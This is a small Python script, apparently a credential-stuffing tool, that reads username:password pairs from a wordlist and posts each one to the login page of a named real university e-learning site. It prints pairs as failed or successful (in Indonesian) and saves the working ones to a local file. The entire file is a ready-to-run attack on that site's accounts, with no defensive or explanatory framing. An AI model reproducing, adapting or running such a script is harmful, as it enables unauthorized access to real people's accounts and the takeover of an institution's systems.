import os, time
import requests as req
from bs4 import BeautifulSoup as bs

c    = '\033['
red  = c+'91m'
gren = c+'92m'
yell = c+'93m'
cyan = c+'96m'
grey = c+'90m'
off  = c+'m'

'''
> Code by dsmembara
'''
def __(u,p):
	try:
		req.post('http://exelsa2012.usd.ac.id/login/index.php',data={'username':u,'password':p,'submit':'submit'}).headers['Set-Cookie']
		print(f'{off}[{red}GAGAL{off}] {red}{u}{off}:{red}{p}')
	except:
		print(f'{off}[{gren}BERHASIL{off}] {gren}{u}{off}:{gren}{p}')
		with open('hasil_usd.txt', 'a') as _f:
			_f.write(f'{u}:{p}\n')

def main():
	try:
		with open(input('Wordlist > '),'r') as o_o:
			print()
			for _o in o_o.readlines():
				_ = _o.strip().split(':')
				__(_[0],_[1])
	except Exception as er:
		exit(f'{red}{er}')

if __name__=='__main__':
	main()